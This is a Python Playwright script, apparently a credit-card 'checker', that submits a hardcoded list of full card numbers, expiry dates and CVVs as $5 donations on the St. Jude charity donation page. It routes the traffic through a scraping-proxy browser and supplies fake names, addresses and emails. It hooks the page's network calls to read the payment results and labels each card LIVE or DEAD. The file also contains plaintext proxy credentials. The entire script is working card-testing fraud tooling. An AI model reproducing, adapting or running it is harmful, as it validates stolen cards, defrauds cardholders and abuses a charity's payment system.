#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
St. Jude Checker — v19 (Final Edition)
- BrightData Scraping Browser
- Read from /oms/v1/order API
- Refresh per card
- Retry logic
"""

import re
import os
import time
import json
import random
from playwright.sync_api import sync_playwright


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

CARDS = [
    "5126693793783705|08|2030|560",
    "5286893388179535|11|2026|595",
    "5524336973513710|02|30|819",
    "4815830046733918|03|2031|318",
    "5362199060708113|06|2030|446",
]

BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

DONATE_URL = "https://www.stjude.org/donate/donate-to-st-jude.html"

# ═══ إعدادات ═══
RECONNECT_EVERY = 2           # إعادة اتصال كل N كروت
MAX_FORM_RETRIES = 3          # محاولات الفورم
MAX_RESPONSE_WAIT = 40        # ثواني انتظار الرد
DELAY_BETWEEN_CARDS = 13      # انتظار بين الكروت

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]

ADDRESSES = [
    {"a1": "1600 Amphitheatre Pkwy", "c": "Mountain View", "s": "CA", "z": "94043"},
    {"a1": "350 Fifth Avenue", "c": "New York", "s": "NY", "z": "10118"},
    {"a1": "233 S Wacker Dr", "c": "Chicago", "s": "IL", "z": "60606"},
    {"a1": "1 Microsoft Way", "c": "Redmond", "s": "WA", "z": "98052"},
    {"a1": "4 Yawkey Way", "c": "Boston", "s": "MA", "z": "02215"},
]


# ═══════════════════════════════════════════════════════════
# RESPONSE MAPPING
# ═══════════════════════════════════════════════════════════

REASON_MAP = {
    # ═══ Live ═══
    'InsufficientFunds': 'INSUFFICIENT_FUNDS',
    'CreditCardInsufficientFunds': 'INSUFFICIENT_FUNDS',
    
    # ═══ Invalid ═══
    'CreditCardInvalidAccount': 'INVALID_CARD',
    'CreditCardNumberInvalid': 'INVALID_CARD_NUMBER',
    'InvalidCardNumber': 'INVALID_CARD_NUMBER',
    
    # ═══ Expired ═══
    'CreditCardExpired': 'EXPIRED_CARD',
    'ExpiredCard': 'EXPIRED_CARD',
    'CardExpired': 'EXPIRED_CARD',
    
    # ═══ CVV ═══
    'CreditCardCVVInvalid': 'CVV_INVALID',
    'CVVInvalid': 'CVV_INVALID',
    'InvalidCVV': 'CVV_INVALID',
    
    # ═══ Declined ═══
    'CreditCardDeclined': 'DECLINED',
    'Declined': 'DECLINED',
    'CardDeclined': 'DECLINED',
    'TransactionDeclined': 'DECLINED',
    'PaymentDeclined': 'DECLINED',
    'CreditCardError': 'DECLINED',
    
    # ═══ Do Not Honor ═══
    'CreditCardDoNotHonor': 'DO_NOT_HONOR',
    'DoNotHonor': 'DO_NOT_HONOR',
    
    # ═══ Restricted ═══
    'CreditCardRestricted': 'RESTRICTED_CARD',
    'RestrictedCard': 'RESTRICTED_CARD',
    
    # ═══ Lost/Stolen ═══
    'CreditCardLost': 'LOST_CARD',
    'CreditCardStolen': 'STOLEN_CARD',
    'LostCard': 'LOST_CARD',
    'StolenCard': 'STOLEN_CARD',
    
    # ═══ Fraud ═══
    'CreditCardFraud': 'SUSPECTED_FRAUD',
    'SuspectedFraud': 'SUSPECTED_FRAUD',
    'FraudulentTransaction': 'SUSPECTED_FRAUD',
    
    # ═══ Not Supported ═══
    'CreditCardNotSupported': 'CARD_NOT_SUPPORTED',
    'CardNotSupported': 'CARD_NOT_SUPPORTED',
    
    # ═══ Charge ═══
    'Approved': 'CHARGE 1.0',
    'Success': 'CHARGE 1.0',
    'Charged': 'CHARGE 1.0',
    'Completed': 'CHARGE 1.0',
    'Authorized': 'CHARGE 1.0',
    'Captured': 'CHARGE 1.0',
    'PaymentApproved': 'CHARGE 1.0',
    'PaymentSuccess': 'CHARGE 1.0',
    'TransactionApproved': 'CHARGE 1.0',
}

TEXT_PATTERNS = [
    (r"there are insufficient funds[^.]*\.", "INSUFFICIENT_FUNDS"),
    (r"insufficient funds[^.]*\.", "INSUFFICIENT_FUNDS"),
    (r"credit card account is invalid[^.]*\.", "INVALID_CARD"),
    (r"your card is invalid[^.]*\.", "INVALID_CARD"),
    (r"card number is invalid[^.]*\.", "INVALID_CARD_NUMBER"),
    (r"entered date is in the past[^.]*\.", "EXPIRED_CARD"),
    (r"card has expired[^.]*\.", "EXPIRED_CARD"),
    (r"security code is invalid[^.]*\.", "CVV_INVALID"),
    (r"security code is incorrect[^.]*\.", "CVV_INVALID"),
    (r"your card was declined[^.]*\.", "DECLINED"),
    (r"card was declined[^.]*\.", "DECLINED"),
    (r"transaction was declined[^.]*\.", "DECLINED"),
    (r"payment was declined[^.]*\.", "DECLINED"),
    (r"payment did not go through[^.]*\.", "DECLINED"),
    (r"do not honor[^.]*\.", "DO_NOT_HONOR"),
    (r"restricted card[^.]*\.", "RESTRICTED_CARD"),
    (r"suspected fraud[^.]*\.", "SUSPECTED_FRAUD"),
    (r"fraudulent[^.]*\.", "SUSPECTED_FRAUD"),
    (r"lost card[^.]*\.", "LOST_CARD"),
    (r"stolen card[^.]*\.", "STOLEN_CARD"),
    (r"card not supported[^.]*\.", "CARD_NOT_SUPPORTED"),
    (r"thank you for your donation[^.]*\.", "CHARGE 1.0"),
    (r"your donation was successful[^.]*\.", "CHARGE 1.0"),
    (r"donation was successful[^.]*\.", "CHARGE 1.0"),
    (r"donation complete[^.]*\.", "CHARGE 1.0"),
    (r"we are sorry[^.]*\.", "SERVER_ERROR"),
    (r"unable to process[^.]*\.", "SERVER_ERROR"),
]


def extract_from_api(responses):
    """استخراج الرد من /oms/v1/order"""
    for resp in reversed(responses):
        url = resp.get('url', '')
        body = resp.get('body', '')
        
        if '/oms/v1/order' not in url:
            continue
        
        if not body:
            continue
        
        try:
            data = json.loads(body)
            reason = data.get('reason', '')
            description = data.get('description', '')
            
            if reason:
                mapped = REASON_MAP.get(reason, reason)
                return mapped, f"{reason}: {description}"[:200]
            
            if description:
                return description[:200], description[:200]
        except:
            pass
    
    return None, None


def extract_from_text(page_text):
    """استخراج الرد من نص الصفحة"""
    text_lower = page_text.lower()
    
    for pattern, code in TEXT_PATTERNS:
        if re.search(pattern, text_lower):
            m = re.search(pattern, text_lower)
            return code, m.group(0).strip()[:200]
    
    return None, None


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════

def make_email(f, l):
    return f"{f.lower()}{l.lower()}{random.randint(100,999)}@gmail.com"


def connect_browser(p):
    """اتصال بـ BrightData Scraping Browser"""
    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
    print("🌐 Connecting to BrightData...", flush=True)
    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
    print("✅ Connected", flush=True)
    return browser


# ═══════════════════════════════════════════════════════════
# CHECK ONE CARD
# ═══════════════════════════════════════════════════════════

def check_card(browser, card, idx, total):
    t0 = time.time()
    result_code = "UNKNOWN"
    result_text = ""
    
    parts = card.strip().split("|")
    if len(parts) < 4:
        return ("INVALID_FORMAT", "Bad format", 0)
    
    num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy
    
    print(f"\n{'='*60}", flush=True)
    print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}", flush=True)
    print(f"{'='*60}", flush=True)
    
    # ═══ Retry Loop ═══
    for attempt in range(1, MAX_FORM_RETRIES + 1):
        context = None
        try:
            # ═══ جلسة جديدة لكل كارت ═══
            context = browser.new_context(
                viewport={"width": 1366, "height": 900},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
            )
            page = context.new_page()
            
            # ═══ Intercept Fetch ═══
            page.add_init_script("""
                window.__all_responses = [];
                
                const origFetch = window.fetch;
                window.fetch = async function(...args) {
                    const response = await origFetch.apply(this, args);
                    const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
                    try {
                        const clone = response.clone();
                        const body = await clone.text();
                        window.__all_responses.push({
                            url: url,
                            status: response.status,
                            body: body
                        });
                    } catch(e) {}
                    return response;
                };
                
                const origOpen = XMLHttpRequest.prototype.open;
                const origSend = XMLHttpRequest.prototype.send;
                
                XMLHttpRequest.prototype.open = function(m, u) {
                    this.__url = u;
                    return origOpen.apply(this, arguments);
                };
                
                XMLHttpRequest.prototype.send = function() {
                    this.addEventListener('load', function() {
                        window.__all_responses.push({
                            url: this.__url || '',
                            status: this.status,
                            body: this.responseText || ''
                        });
                    });
                    return origSend.apply(this, arguments);
                };
            """)
            
            # ═══ فتح الصفحة ═══
            print(f"📄 Loading (attempt {attempt}/{MAX_FORM_RETRIES})...", flush=True)
            
            try:
                page.goto(DONATE_URL, timeout=60000, wait_until="domcontentloaded")
            except Exception as e:
                print(f"⚠️ Nav: {str(e)[:80]}", flush=True)
            
            time.sleep(3)
            
            # ═══ Check captcha/robot ═══
            try:
                body_text = page.inner_text("body")
                if "robot" in body_text.lower() or "captcha" in body_text.lower():
                    print("⚠️ Captcha, waiting 15s...", flush=True)
                    time.sleep(15)
                    page.reload(wait_until="domcontentloaded")
                    time.sleep(3)
            except:
                pass
            
            # ═══ Other Payment Options ═══
            try:
                page.wait_for_selector("#continue-to-other-payment", timeout=25000, state="visible")
                page.click("#continue-to-other-payment")
                print("👆 Other Payment", flush=True)
                time.sleep(2)
            except:
                print("⚠️ No other payment btn", flush=True)
            
            # ═══ Credit Card ═══
            try:
                page.wait_for_selector("#cc-link", timeout=25000, state="visible")
                page.click("#cc-link")
                print("👆 Credit Card", flush=True)
                time.sleep(2)
            except:
                print("⚠️ No CC btn", flush=True)
            
            # ═══ انتظار الفورم ═══
            try:
                page.wait_for_selector("#cardNumber", timeout=30000, state="visible")
                print("✅ Form ready", flush=True)
            except:
                print(f"❌ No form (attempt {attempt})", flush=True)
                try:
                    context.close()
                except:
                    pass
                if attempt < MAX_FORM_RETRIES:
                    time.sleep(3)
                    continue
                else:
                    return ("NO_FORM", "Form not found", round(time.time() - t0, 1))
            
            # ═══ Fill Form ═══
            f = random.choice(FIRST_NAMES)
            l = random.choice(LAST_NAMES)
            em = make_email(f, l)
            ad = random.choice(ADDRESSES)
            ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
            
            print("📝 Filling...", flush=True)
            
            page.fill("#cardNumber", num)
            page.fill("#expMonth", mm)
            page.fill("#expYear", yy[2:] if len(yy) == 4 else yy)
            page.fill("#cardCvv2", cvv)
            
            try:
                page.fill("#donationAmountOther", "5")
            except:
                pass
            
            page.fill("#firstName", f)
            page.fill("#lastName", l)
            page.fill("#email", em)
            page.fill("#address1", ad["a1"])
            page.fill("#city", ad["c"])
            
            try:
                page.select_option("#stateProvince", ad["s"])
            except:
                pass
            
            page.fill("#zipPostalCode", ad["z"])
            
            try:
                page.fill("#phoneNumber", ph)
            except:
                pass
            
            print("✅ Form filled", flush=True)
            time.sleep(0.3)
            
            # ═══ Click Donate ═══
            print("👆 Donate...", flush=True)
            try:
                page.click("#donateButton")
            except:
                pass
            
            # ═══ انتظار الرد ═══
            print("⏳ Waiting response...", flush=True)
            
            for i in range(MAX_RESPONSE_WAIT):
                time.sleep(1)
                
                # ═══ 1. من API ═══
                try:
                    responses = page.evaluate("() => window.__all_responses || []")
                    code, text = extract_from_api(responses)
                    if code:
                        result_code = code
                        result_text = text
                        break
                except:
                    pass
                
                # ═══ 2. من الصفحة ═══
                try:
                    page_text = page.inner_text("body")
                    code, text = extract_from_text(page_text)
                    if code:
                        result_code = code
                        result_text = text
                        break
                except:
                    pass
            
            # ═══ انتظر شوية قبل ما نقفل الـ context ═══
            time.sleep(2)
            
            # ═══ إعادة تحميل الصفحة قبل إغلاق الـ context ═══
            print("🔄 Refreshing page before close...", flush=True)
            try:
                page.reload(wait_until="domcontentloaded", timeout=30000)
                time.sleep(2)
            except:
                pass
            
            try:
                context.close()
            except:
                pass
            
            # ═══ خروج من الـ Retry ═══
            break
        
        except Exception as e:
            print(f"❌ Attempt {attempt}: {str(e)[:100]}", flush=True)
            if context:
                try:
                    context.close()
                except:
                    pass
            
            # ═══ Browser مات؟ ═══
            if "closed" in str(e).lower() or "target" in str(e).lower():
                result_code = "ERR_BROWSER_CLOSED"
                result_text = str(e)[:100]
                break
            
            if attempt < MAX_FORM_RETRIES:
                time.sleep(3)
                continue
            else:
                result_code = f"ERR: {str(e)[:80]}"
                result_text = str(e)[:100]
                break
    
    elapsed = round(time.time() - t0, 1)
    
    print(f"📝 {result_code}", flush=True)
    if result_text:
        print(f"   {result_text}", flush=True)
    print(f"⏱️ {elapsed}s", flush=True)
    
    return (result_code, result_text, elapsed)


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    print("=" * 60, flush=True)
    print("  St. Jude Checker — v19 (Final)", flush=True)
    print("=" * 60, flush=True)
    print(f"📁 Cards: {len(CARDS)}", flush=True)
    print(f"🔄 Reconnect every: {RECONNECT_EVERY}", flush=True)
    print(f"🔄 Form retries: {MAX_FORM_RETRIES}", flush=True)
    print(f"⏱️ Response wait: {MAX_RESPONSE_WAIT}s", flush=True)
    print(f"⏸️ Delay between cards: {DELAY_BETWEEN_CARDS}s", flush=True)
    print("=" * 60, flush=True)
    
    results = []
    t_start = time.time()
    
    browser = None
    cards_since_reconnect = 0
    
    try:
        with sync_playwright() as p:
            browser = connect_browser(p)
            
            for idx, card in enumerate(CARDS, 1):
                # ═══ إعادة اتصال كل N كروت ═══
                if cards_since_reconnect >= RECONNECT_EVERY:
                    print(f"\n🔄 Reconnecting (after {cards_since_reconnect})...", flush=True)
                    try:
                        browser.close()
                    except:
                        pass
                    time.sleep(3)
                    try:
                        browser = connect_browser(p)
                        cards_since_reconnect = 0
                    except Exception as e:
                        print(f"❌ Reconnect failed: {str(e)[:100]}", flush=True)
                        break
                
                # ═══ Check ═══
                try:
                    code, text, elapsed = check_card(browser, card, idx, len(CARDS))
                except Exception as e:
                    print(f"❌ Card error: {str(e)[:100]}", flush=True)
                    code, text, elapsed = f"ERR: {str(e)[:80]}", str(e)[:100], 0
                
                results.append({
                    'card': card,
                    'code': code,
                    'text': text,
                    'elapsed': elapsed,
                })
                
                cards_since_reconnect += 1
                
                # ═══ انتظار ═══
                if idx < len(CARDS):
                    print(f"\n⏸️ Waiting {DELAY_BETWEEN_CARDS}s...", flush=True)
                    time.sleep(DELAY_BETWEEN_CARDS)
            
            try:
                browser.close()
            except:
                pass
    
    except Exception as e:
        print(f"❌ Main error: {str(e)[:200]}", flush=True)
    
    total_time = round(time.time() - t_start, 1)
    
    # ═══ النتائج النهائية ═══
    print("\n" + "=" * 60, flush=True)
    print("📊 FINAL RESULTS", flush=True)
    print("=" * 60, flush=True)
    
    live_count = 0
    dead_count = 0
    error_count = 0
    
    live_codes = [
        'INSUFFICIENT_FUNDS', 'DECLINED', 'EXPIRED_CARD', 'CVV_INVALID',
        'INVALID_CARD', 'INVALID_CARD_NUMBER', 'DO_NOT_HONOR',
        'RESTRICTED_CARD', 'SUSPECTED_FRAUD', 'LOST_CARD', 'STOLEN_CARD',
        'CARD_NOT_SUPPORTED', 'CHARGE 1.0'
    ]
    
    for r in results:
        card = r['card']
        code = r['code']
        text = r['text']
        elapsed = r['elapsed']
        
        if code in live_codes:
            status = "✅ LIVE"
            live_count += 1
        elif code.startswith('ERR') or code in ['NO_RESPONSE', 'NO_FORM', 'SERVER_ERROR', 'UNKNOWN']:
            status = "⚠️ ERROR"
            error_count += 1
        else:
            status = "❌ DEAD"
            dead_count += 1
        
        print(f"\n💳 {card}", flush=True)
        print(f"   📝 {code}", flush=True)
        if text:
            print(f"   💬 {text}", flush=True)
        print(f"   {status} | ⏱️ {elapsed}s", flush=True)
    
    print("\n" + "=" * 60, flush=True)
    print(f"✅ Live: {live_count}", flush=True)
    print(f"❌ Dead: {dead_count}", flush=True)
    print(f"⚠️ Errors: {error_count}", flush=True)
    print(f"⏱️ Total: {total_time}s ({round(total_time/60, 1)} min)", flush=True)
    print("=" * 60, flush=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Stopped", flush=True)
    except Exception as e:
        print(f"\n❌ Error: {str(e)[:200]}", flush=True)
